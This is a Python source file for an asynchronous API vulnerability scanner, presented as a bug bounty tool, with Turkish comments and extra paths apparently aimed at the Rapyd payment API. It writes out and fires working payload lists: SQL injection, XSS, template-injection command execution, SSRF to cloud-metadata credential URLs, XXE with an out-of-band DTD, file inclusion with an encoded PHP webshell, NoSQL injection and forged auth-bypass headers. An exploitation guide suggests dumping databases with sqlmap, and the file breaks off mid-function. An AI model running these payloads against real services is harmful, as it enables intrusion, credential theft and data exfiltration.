#!/usr/bin/env python3
# Elite API Security Hunter - Professional Bug Bounty Scanner
# WARNING: Only use on authorized targets with written permission

import asyncio
import aiohttp
import json
import time
import random
import hashlib
import base64
import os
import sys
import socket
import ssl
import struct
from typing import Dict, List, Set, Optional, Tuple, Any
from urllib.parse import urljoin, urlparse, quote, unquote, parse_qs
import string
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import warnings
warnings.filterwarnings("ignore")

# Optional imports
try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

class PayloadManager:
    """Advanced payload management system"""
    
    def __init__(self, base_dir="payloads"):
        self.base_dir = base_dir
        self.payloads = {}
        self.ensure_payload_structure()
        self.load_all_payloads()
    
    def ensure_payload_structure(self):
        """Create payload directory structure if not exists"""
        if not os.path.exists(self.base_dir):
            os.makedirs(self.base_dir)
            self.create_default_payloads()
    
    def create_default_payloads(self):
        """Create default payload files"""
        defaults = {
            'sql_injection.txt': [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "' OR '1'='1'/*",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' or 1=1--",
                "' or 1=1#",
                "' or 1=1/*",
                "') or '1'='1--",
                "') or ('1'='1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION ALL SELECT NULL--",
                "1' AND SLEEP(5)#",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1';WAITFOR DELAY '0:0:5'--",
                "1' AND pg_sleep(5)--",
                "' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--",
                "' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--",
                "' UNION SELECT @@version,NULL,NULL--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--"
            ],
            
            'xss.txt': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<iframe src=javascript:alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "'-alert(1)-'",
                "\\'-alert(1)//",
                "</script><script>alert(1)</script>",
                "onerror=alert;throw 1",
                "{alert(1)}",
                "constructor.constructor('alert(1)')()",
                "{{constructor.constructor('alert(1)')()}}",
                "<img src=# onerror=\"alert(1)\">"
            ],
            
            'ssti.txt': [
                "{{7*7}}",
                "{{7*'7'}}",
                "${7*7}",
                "<%=7*7%>",
                "#{7*7}",
                "*{7*7}",
                "@(7*7)",
                "~[7*7]",
                "{{config}}",
                "{{config.items()}}",
                "{{settings}}",
                "{{settings.SECRET_KEY}}",
                "{{self._TemplateReference__context}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "${T(java.lang.System).getenv()}",
                "#{T(java.lang.Runtime).getRuntime().exec('id')}",
                "<%= system('id') %>",
                "<%= `id` %>",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
                "{{['id']|map('system')|join}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}"
            ],
            
            'ssrf.txt': [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
                "http://169.254.169.254/metadata/instance?api-version=2019-06-01",
                "http://169.254.169.254/metadata/instance/compute?api-version=2019-06-01",
                "http://localhost/",
                "http://localhost:22/",
                "http://localhost:80/",
                "http://localhost:443/",
                "http://localhost:8080/",
                "http://localhost:8443/",
                "http://127.0.0.1/",
                "http://127.0.0.1:22/",
                "http://127.0.0.1:80/",
                "http://0.0.0.0/",
                "http://0/",
                "http://[::1]/",
                "http://[0000::1]/",
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "gopher://localhost:8080/_GET / HTTP/1.0",
                "dict://localhost:11211/",
                "sftp://localhost:22/",
                "tftp://localhost:69/etc/passwd",
                "ldap://localhost:389/",
                "jar:http://localhost!/",
                "http://2130706433/",
                "http://0x7f.0x0.0x0.0x1/",
                "http://0177.0.0.1/"
            ],
            
            'api_endpoints.txt': [
                "/api",
                "/api/v1",
                "/api/v2",
                "/api/v3",
                "/v1",
                "/v2",
                "/v3",
                "/graphql",
                "/gql",
                "/query",
                "/rest",
                "/rest/v1",
                "/rest/v2",
                "/services",
                "/service",
                "/ws",
                "/webservice",
                "/api/users",
                "/api/user",
                "/api/admin",
                "/api/administrator",
                "/api/login",
                "/api/signin",
                "/api/auth",
                "/api/authenticate",
                "/api/authorization",
                "/api/oauth",
                "/api/oauth2",
                "/api/token",
                "/api/refresh",
                "/api/register",
                "/api/signup",
                "/api/account",
                "/api/accounts",
                "/api/profile",
                "/api/profiles",
                "/api/me",
                "/api/config",
                "/api/configuration",
                "/api/settings",
                "/api/preferences",
                "/api/internal",
                "/api/private",
                "/api/public",
                "/api/health",
                "/api/healthcheck",
                "/api/status",
                "/api/ping",
                "/api/metrics",
                "/api/stats",
                "/api/statistics",
                "/api/info",
                "/api/version",
                "/api/debug",
                "/api/test",
                "/api/swagger",
                "/api/docs",
                "/api/documentation",
                "/api-docs",
                "/swagger",
                "/swagger-ui",
                "/openapi",
                "/openapi.json",
                "/swagger.json"
            ],
            
            'auth_bypass_headers.txt': [
                "X-Originating-IP: 127.0.0.1",
                "X-Forwarded-For: 127.0.0.1",
                "X-Forwarded-For: localhost",
                "X-Forwarded-For: 10.0.0.0",
                "X-Forwarded-For: 172.16.0.0",
                "X-Forwarded-For: 192.168.1.0",
                "X-Real-IP: 127.0.0.1",
                "X-Remote-IP: 127.0.0.1",
                "X-Remote-Addr: 127.0.0.1",
                "X-Client-IP: 127.0.0.1",
                "X-Host: 127.0.0.1",
                "X-Forwarded-Host: localhost",
                "X-Forwarded-Host: 127.0.0.1",
                "X-Original-URL: /admin",
                "X-Rewrite-URL: /admin",
                "X-Override-URL: /admin",
                "X-HTTP-Method-Override: GET",
                "X-HTTP-Method-Override: POST",
                "X-Method-Override: GET",
                "X-Method-Override: POST",
                "Authorization: Bearer null",
                "Authorization: Bearer",
                "Authorization: Basic YWRtaW46YWRtaW4=",
                "Authorization: Basic dGVzdDp0ZXN0",
                "Authorization: Basic cm9vdDpyb290",
                "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
            ],
            
            'command_injection.txt': [
                ";id",
                "|id",
                "`id`",
                "$(id)",
                ";whoami",
                "|whoami",
                "`whoami`",
                "$(whoami)",
                ";ls",
                "|ls",
                "`ls`",
                "$(ls)",
                ";cat /etc/passwd",
                "|cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "||ping -c 10 127.0.0.1",
                "&&ping -c 10 127.0.0.1",
                ";ping -c 10 127.0.0.1",
                "|ping -c 10 127.0.0.1",
                "`ping -c 10 127.0.0.1`",
                "$(ping -c 10 127.0.0.1)",
                ";sleep 5",
                "|sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "\\nid\\n",
                "\\n/bin/ls -al\\n",
                "\\n/usr/bin/id\\n"
            ],
            
            'nosql_injection.txt': [
                '{"$ne": null}',
                '{"$ne": ""}',
                '{"$gt": ""}',
                '{"$gt": -1}',
                '{"$exists": true}',
                '{"$regex": ".*"}',
                '{"$where": "1==1"}',
                '{"$where": "this.password.length > 0"}',
                '{"username": {"$ne": null}, "password": {"$ne": null}}',
                '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
                '{"$or": [{"username": "admin"}, {"password": {"$ne": 1}}]}',
                '{"username": {"$regex": "^adm"}}',
                '{"username": {"$regex": "^admin"}}',
                '[$ne]=1',
                '[$gt]=',
                '[$exists]=true',
                '{"username": {"$in": ["admin", "administrator"]}}',
                '{"$comment": "successful_login"}',
                '{"$and": [{"username": "admin"}, {"password": {"$ne": null}}]}'
            ],
            
            'xxe.txt': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://COLLABORATOR/xxe.dtd">%remote;]><root/>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://id">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "gopher://localhost:8080/_GET / HTTP/1.0">]><root>&test;</root>'
            ],
            
            'lfi.txt': [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "../../../../../../etc/passwd",
                "../../../../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "....\\\\....\\\\....\\\\etc\\\\passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "..\\..\\..\\..\\..\\windows\\win.ini",
                "/etc/passwd",
                "\\windows\\win.ini",
                "C:\\windows\\win.ini",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "php://filter/convert.base64-encode/resource=../../../etc/passwd",
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "expect://id",
                "php://input",
                "php://filter/read=string.rot13/resource=/etc/passwd",
                "php://filter/zlib.deflate/resource=/etc/passwd",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
            ]
        }
        
        for filename, payloads in defaults.items():
            filepath = os.path.join(self.base_dir, filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write('\n'.join(payloads))
            print(f"[+] Created {filepath} with {len(payloads)} payloads")
    
    def load_all_payloads(self):
        """Load all payload files"""
        for filename in os.listdir(self.base_dir):
            if filename.endswith('.txt'):
                filepath = os.path.join(self.base_dir, filename)
                payload_type = filename.replace('.txt', '')
                
                with open(filepath, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    self.payloads[payload_type] = payloads
                    
    def get(self, payload_type: str) -> List[str]:
        """Get payloads by type"""
        return self.payloads.get(payload_type, [])

class BugBountyScanner:
    """Elite Bug Bounty API Security Scanner"""
    
    def __init__(self, target: str, threads: int = 30, aggressive: int = 8):
        self.target = target if target.startswith('http') else f'https://{target}'
        self.domain = urlparse(self.target).netloc
        self.threads = threads
        self.aggressive = aggressive
        self.session = None
        self.payloads = PayloadManager()
        self.vulnerabilities = []
        self.endpoints_found = set()
        
    async def initialize(self):
        """Initialize async session"""
        timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=10)
        connector = aiohttp.TCPConnector(
            limit=self.threads,
            ssl=False,
            force_close=True
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': self.get_random_ua(),
                'Accept': 'application/json, text/html, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache'
            }
        )
    
    def get_random_ua(self):
        """Random User-Agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        return random.choice(agents)
    
    async def discover_endpoints(self) -> Set[str]:
        """Geliştirilmiş endpoint discovery"""
        endpoints = set()
        
        # Önce base domain'i test et
        base_check = await self.verify_endpoint(self.target)
        if base_check:
            endpoints.add(base_check)
            print(f"  [+] Base URL responsive: {self.target}")
        
        # Common API paths
        api_paths = self.payloads.get('api_endpoints')
        
        # Rapyd API için özel pathler ekle
        rapyd_paths = [
            '/v1',
            '/v1/checkout',
            '/v1/payments',
            '/v1/wallets',
            '/v1/collect',
            '/v1/disburse',
            '/v1/issuing',
            '/sandbox',
            '/production'
        ]
        
        all_paths = api_paths + rapyd_paths
        
        print(f"[*] Testing {len(all_paths)} potential endpoints...")
        
        # Daha hızlı tarama için batch
        batch_size = 10
        for i in range(0, len(all_paths), batch_size):
            batch = all_paths[i:i+batch_size]
            tasks = []
            
            for path in batch:
                url = urljoin(self.target, path)
                tasks.append(self.verify_endpoint(url))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for idx, result in enumerate(results):
                if result and not isinstance(result, Exception):
                    endpoints.add(result)
                    print(f"  [+] Found: {result}")
            
            # Rate limiting
            await asyncio.sleep(0.5)
        
        # Header discovery - bazı API'ler header gerektiriyor
        if len(endpoints) < 5:
            print("[*] Trying with API headers...")
            headers_to_test = [
                {'X-API-Key': 'test'},
                {'Authorization': 'Bearer test'},
                {'API-Key': 'test'}
            ]
            
            for headers in headers_to_test:
                test_url = self.target
                try:
                    async with self.session.get(test_url, headers=headers) as response:
                        if response.status in [401, 403]:  # Authentication required = API exists
                            print(f"  [+] API requires authentication: {test_url}")
                            endpoints.add(test_url)
                except:
                    pass
        
        self.endpoints_found = endpoints
        return endpoints
    
    async def verify_endpoint(self, url: str) -> Optional[str]:
        """Daha akıllı endpoint doğrulama"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD']
        
        for method in methods[:3]:
            try:
                async with self.session.request(
                    method, 
                    url, 
                    allow_redirects=False,
                    ssl=False
                ) as response:
                    # Daha geniş status kodu kontrolü
                    if response.status in [200, 201, 204, 301, 302, 400, 401, 403, 405, 500]:
                        # 401/403 authentication gerektiriyor ama endpoint var
                        if response.status in [401, 403]:
                            print(f"  [+] Protected endpoint found: {url} (Status: {response.status})")
                        return url
                        
                    # Content-Type kontrolü
                    content_type = response.headers.get('Content-Type', '')
                    if 'application/json' in content_type or 'text' in content_type:
                        return url
                        
            except aiohttp.ClientError:
                continue
            except:
                continue
        
        return None
    
    async def extract_js_endpoints(self) -> Set[str]:
        """Extract endpoints from JavaScript"""
        endpoints = set()
        
        try:
            async with self.session.get(self.target) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # API patterns
                    patterns = [
                        r'["\'](/api/[a-zA-Z0-9/_-]+)["\']',
                        r'["\'](/v\d+/[a-zA-Z0-9/_-]+)["\']',
                        r'fetch\(["\']([^"\']+)["\']',
                        r'axios\.[a-z]+\(["\']([^"\']+)["\']',
                        r'endpoint["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches[:20]:  # Limit matches
                            if match.startswith('/'):
                                url = urljoin(self.target, match)
                                endpoints.add(url)
        except:
            pass
        
        return endpoints
    
    async def extract_robots_endpoints(self) -> Set[str]:
        """Extract from robots.txt"""
        endpoints = set()
        
        try:
            robots_url = urljoin(self.target, '/robots.txt')
            async with self.session.get(robots_url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # Extract paths
                    lines = content.split('\n')
                    for line in lines:
                        if 'Disallow:' in line or 'Allow:' in line:
                            path = line.split(':', 1)[1].strip()
                            if path and path != '/':
                                url = urljoin(self.target, path)
                                endpoints.add(url)
        except:
            pass
        
        return endpoints

    async def test_without_auth(self, endpoint: str) -> List[Dict]:
        """Authentication olmadan test et"""
        findings = []
        
        # Information disclosure in error messages
        try:
            async with self.session.get(endpoint) as response:
                if response.status in [400, 401, 403, 500]:
                    content = await response.text()
                    
                    # Sensitive info in errors
                    sensitive_patterns = [
                        (r'["\']?api[_-]?key["\']?\s*[:=]', 'API Key disclosed'),
                        (r'stack.*trace', 'Stack trace exposed'),
                        (r'SQL.*error', 'SQL error exposed'),
                        (r'"error_code":', 'Detailed error codes'),
                        (r'["\']?debug["\']?\s*[:=]\s*true', 'Debug mode enabled')
                    ]
                    
                    for pattern, desc in sensitive_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            findings.append({
                                'type': 'INFORMATION_DISCLOSURE',
                                'endpoint': endpoint,
                                'severity': 'MEDIUM',
                                'confidence': 'HIGH',
                                'evidence': desc
                            })
        except:
            pass
        
        return findings

    async def test_sql_injection(self, endpoint: str) -> List[Dict]:
        """Test SQL Injection"""
        findings = []
        payloads = self.payloads.get('sql_injection')
        
        for payload in payloads[:10 if self.aggressive > 5 else 5]:
            # GET test
            params = ['id', 'user', 'search', 'q', 'filter', 'category', 'page']
            
            for param in params[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    # Time-based detection
                    if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                        start = time.time()
                        async with self.session.get(test_url) as response:
                            elapsed = time.time() - start
                            
                            if elapsed > 4.5:
                                findings.append({
                                    'type': 'SQL_INJECTION',
                                    'subtype': 'Time-based Blind',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'CRITICAL',
                                    'confidence': 'HIGH',
                                    'evidence': f'Response delayed {elapsed:.1f}s'
                                })
                                return findings
                    
                    # Error-based detection
                    else:
                        async with self.session.get(test_url) as response:
                            if response.status in [200, 500]:
                                content = await response.text()
                                
                                error_patterns = [
                                    'sql', 'mysql', 'syntax', 'error',
                                    'warning', 'ora-', 'postgresql', 'jdbc'
                                ]
                                
                                for pattern in error_patterns:
                                    if pattern in content.lower():
                                        findings.append({
                                            'type': 'SQL_INJECTION', 
                                            'subtype': 'Error-based',
                                            'endpoint': endpoint,
                                            'parameter': param,
                                            'payload': payload,
                                            'severity': 'CRITICAL',
                                            'confidence': 'HIGH',
                                            'evidence': f'SQL error detected: {pattern}'
                                        })
                                        return findings
                except:
                    pass
        
        return findings
    
    async def test_xss(self, endpoint: str) -> List[Dict]:
        """Test Cross-Site Scripting"""
        findings = []
        payloads = self.payloads.get('xss')
        
        for payload in payloads[:8]:
            params = ['q', 'search', 'query', 'keyword', 'name', 'message']
            
            for param in params[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check if payload reflected
                            if payload in content:
                                findings.append({
                                    'type': 'XSS',
                                    'subtype': 'Reflected',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'HIGH',
                                    'confidence': 'HIGH',
                                    'evidence': 'Payload reflected without encoding'
                                })
                                return findings
                except:
                    pass
        
        return findings
    
    async def test_ssti(self, endpoint: str) -> List[Dict]:
        """Test Server-Side Template Injection"""
        findings = []
        
        # SSTI test with verification
        tests = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("{{7*'7'}}", "7777777"),
            ("<%=7*7%>", "49")
        ]
        
        params = ['template', 'name', 'msg', 'content', 'data']
        
        for payload, expected in tests:
            for param in params[:3]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Verify execution
                            if expected in content and payload not in content:
                                findings.append({
                                    'type': 'SSTI',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'CRITICAL',
                                    'confidence': 'HIGH',
                                    'evidence': f'Template executed: {expected} in response'
                                })
                                return findings
                except:
                    pass
        
        return findings
    
    async def test_ssrf(self, endpoint: str) -> List[Dict]:
        """Test Server-Side Request Forgery"""
        findings = []
        payloads = self.payloads.get('ssrf')
        
        params = ['url', 'uri', 'path', 'dest', 'redirect', 'callback', 'next']
        
        for param in params[:4]:
            for payload in payloads[:5]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    start = time.time()
                    async with self.session.get(test_url, timeout=8) as response:
                        elapsed = time.time() - start
                        
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check for internal data
                            indicators = ['root:', 'daemon:', 'localhost', 'metadata', 'instance-id']
                            
                            for indicator in indicators:
                                if indicator in content:
                                    findings.append({
                                        'type': 'SSRF',
                                        'endpoint': endpoint,
                                        'parameter': param,
                                        'payload': payload,
                                        'severity': 'CRITICAL',
                                        'confidence': 'HIGH',
                                        'evidence': f'Internal data leaked: {indicator}'
                                    })
                                    return findings
                        
                        # Timeout detection
                        if elapsed > 7:
                            findings.append({
                                'type': 'SSRF',
                                'subtype': 'Blind',
                                'endpoint': endpoint,
                                'parameter': param,
                                'severity': 'HIGH',
                                'confidence': 'MEDIUM'
                            })
                except asyncio.TimeoutError:
                    findings.append({
                        'type': 'SSRF',
                        'subtype': 'Timeout-based',
                        'endpoint': endpoint,
                        'parameter': param,
                        'severity': 'HIGH',
                        'confidence': 'MEDIUM'
                    })
                except:
                    pass
        
        return findings
    
    async def test_auth_bypass(self, endpoint: str) -> List[Dict]:
        """Test Authentication Bypass"""
        findings = []
        headers = self.payloads.get('auth_bypass_headers')
        
        for header_line in headers[:15]:
            if ':' in header_line:
                header_name, header_value = header_line.split(':', 1)
                test_headers = {header_name.strip(): header_value.strip()}
                
                try:
                    async with self.session.get(endpoint, headers=test_headers) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check for admin/internal access
                            if any(ind in content.lower() for ind in ['admin', 'dashboard', 'internal', 'private']):
                                findings.append({
                                    'type': 'AUTH_BYPASS',
                                    'endpoint': endpoint,
                                    'technique': header_line,
                                    'severity': 'CRITICAL',
                                    'confidence': 'HIGH'
                                })
                                return findings
                except:
                    pass
        
        return findings
    
    async def test_command_injection(self, endpoint: str) -> List[Dict]:
        """Test Command Injection"""
        findings = []
        payloads = self.payloads.get('command_injection')
        
        params = ['cmd', 'exec', 'command', 'ping', 'host', 'file']
        
        for param in params[:3]:
            for payload in payloads[:5]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    # Time-based detection
                    if 'sleep' in payload.lower() or 'ping' in payload.lower():
                        start = time.time()
                        async with self.session.get(test_url) as response:
                            elapsed = time.time() - start
                            
                            if elapsed > 4.5:
                                findings.append({
                                    'type': 'COMMAND_INJECTION',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'CRITICAL',
                                    'confidence': 'HIGH',
                                    'evidence': f'Command executed (delay: {elapsed:.1f}s)'
                                })
                                return findings
                except:
                    pass
        
        return findings
   
    async def test_nosql_injection(self, endpoint: str) -> List[Dict]:
        """Test NoSQL Injection"""
        findings = []
        payloads = self.payloads.get('nosql_injection')
        
        for payload in payloads[:5]:
            try:
                headers = {'Content-Type': 'application/json'}
                async with self.session.post(endpoint, data=payload, headers=headers) as response:
                    if response.status in [200, 201]:
                        content = await response.text()
                        
                        if len(content) > 100 and 'error' not in content.lower():
                            findings.append({
                                'type': 'NOSQL_INJECTION',
                                'endpoint': endpoint,
                                'payload': payload,
                                'severity': 'HIGH',
                                'confidence': 'MEDIUM'
                            })
                            return findings
            except:
                pass
        
        return findings
    
    async def test_xxe(self, endpoint: str) -> List[Dict]:
        """Test XML External Entity"""
        findings = []
        payloads = self.payloads.get('xxe')
        
        for payload in payloads[:3]:
            try:
                headers = {'Content-Type': 'application/xml'}
                async with self.session.post(endpoint, data=payload, headers=headers) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for file content
                        if any(ind in content for ind in ['root:', 'daemon:', 'Windows', '[fonts]']):
                            findings.append({
                                'type': 'XXE',
                                'endpoint': endpoint,
                                'severity': 'CRITICAL',
                                'confidence': 'HIGH',
                                'evidence': 'File contents disclosed'
                            })
                            return findings
            except:
                pass
        
        return findings
    
    async def test_lfi(self, endpoint: str) -> List[Dict]:
        """Test Local File Inclusion"""
        findings = []
        payloads = self.payloads.get('lfi')
        
        params = ['file', 'path', 'page', 'include', 'template', 'load']
        
        for param in params[:3]:
            for payload in payloads[:5]:
                test_url = f"{endpoint}?{param}={quote(payload)}"
                
                try:
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check for file content
                            if any(ind in content for ind in ['root:x:', 'daemon:', '[fonts]', 'Windows NT']):
                                findings.append({
                                    'type': 'LFI',
                                    'endpoint': endpoint,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'HIGH',
                                    'confidence': 'HIGH',
                                    'evidence': 'Local file contents exposed'
                                })
                                return findings
                except:
                    pass
        
        return findings
    
    async def test_endpoint(self, endpoint: str) -> List[Dict]:
        """Run all tests on endpoint"""
        all_findings = []
        
        # Rate limiting
        await asyncio.sleep(0.1)
        
        # Run all tests
        tests = [
            self.test_sql_injection(endpoint),
            self.test_xss(endpoint),
            self.test_ssti(endpoint),
            self.test_ssrf(endpoint),
            self.test_auth_bypass(endpoint),
            self.test_command_injection(endpoint),
            self.test_nosql_injection(endpoint),
            self.test_xxe(endpoint),
            self.test_lfi(endpoint)
        ]
        
        results = await asyncio.gather(*tests, return_exceptions=True)
        
        for result in results:
            if result and not isinstance(result, Exception):
                all_findings.extend(result)
        
        return all_findings
    
    async def scan(self) -> Dict:
        """Main scanning function"""
        await self.initialize()
        
        print("\n" + "="*60)
        print(" BUG BOUNTY API SECURITY SCANNER")
        print("="*60)
        print(f" Target: {self.target}")
        print(f" Aggression Level: {self.aggressive}/10")
        print("="*60 + "\n")
        
        # Phase 1: Discovery
        print("[PHASE 1] Endpoint Discovery")
        endpoints = await self.discover_endpoints()
        
        if not endpoints:
            print("  [!] No endpoints found, using base URL")
            endpoints = {self.target}
        else:
            print(f"  [+] Total endpoints: {len(endpoints)}")
        
        # Phase 2: Security Testing
        print("\n[PHASE 2] Security Testing")
        
        all_findings = []
        tested = 0
        
        for endpoint in list(endpoints):
            tested += 1
            print(f"  [{tested}/{len(endpoints)}] Testing: {endpoint}")
            
            # Normal testler
            findings = await self.test_endpoint(endpoint)
            
            # Eğer authentication gerekiyorsa, farklı testler
            if not findings:
                findings = await self.test_without_auth(endpoint)
            
            all_findings.extend(findings)
            
            # Early exit on critical findings
            critical = [f for f in all_findings if f.get('severity') == 'CRITICAL']
            if len(critical) >= 10:
                print("\n  [!] 10+ CRITICAL vulnerabilities found - stopping scan")
                break
        
        await self.session.close()
        
        # Generate report
        self.generate_report(all_findings, len(endpoints), tested)
        
        return {
            'target': self.target,
            'endpoints_found': len(endpoints),
            'endpoints_tested': tested,
            'vulnerabilities': all_findings,
            'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def generate_report(self, findings: List[Dict], total_endpoints: int, tested: int):
        """Generate detailed final report"""
        
        # Categorize findings
        critical = [f for f in findings if f.get('severity') == 'CRITICAL']
        high = [f for f in findings if f.get('severity') == 'HIGH']
        medium = [f for f in findings if f.get('severity') == 'MEDIUM']
        low = [f for f in findings if f.get('severity') == 'LOW']
        
        print("\n" + "="*60)
        print(" SCAN RESULTS")
        print("="*60)
        print(f" Endpoints Found: {total_endpoints}")
        print(f" Endpoints Tested: {tested}")
        print(f" Total Vulnerabilities: {len(findings)}")
        print("="*60)
        
        if critical:
            print(f"\n[CRITICAL] {len(critical)} vulnerabilities:")
            for vuln in critical[:10]:
                print(f"  • {vuln['type']}: {vuln['endpoint'][:60]}")
                if 'evidence' in vuln:
                    print(f"    Evidence: {vuln['evidence']}")
        
        if high:
            print(f"\n[HIGH] {len(high)} vulnerabilities:")
            for vuln in high[:5]:
                print(f"  • {vuln['type']}: {vuln['endpoint'][:60]}")
        
        if medium:
            print(f"\n[MEDIUM] {len(medium)} vulnerabilities:")
            for vuln in medium[:5]:  # Detayları göster
                print(f"  • {vuln['type']}: {vuln['endpoint'][:60]}")
                if 'evidence' in vuln:
                    print(f"    Evidence: {vuln['evidence']}")
                if 'parameter' in vuln:
                    print(f"    Parameter: {vuln['parameter']}")
        
        if low:
            print(f"\n[LOW] {len(low)} vulnerabilities")

    def print_exploit_guide(self, vuln: Dict):
        """Print exploitation guidance"""
        vuln_type = vuln['type']
        endpoint = vuln['endpoint']
        
        if vuln_type == 'SQL_INJECTION':
            print(f"\n[SQL Injection]")
            print(f"  sqlmap -u \"{endpoint}\" --batch --dump-all --threads=10")
            
        elif vuln_type == 'COMMAND_INJECTION':
            print(f"\n[Command Injection]")
            print(f"  curl \"{endpoint}?cmd=cat%20/etc/passwd\"")
            
        elif vuln_type == 'SSRF':
            print(f"\n[SSRF]")
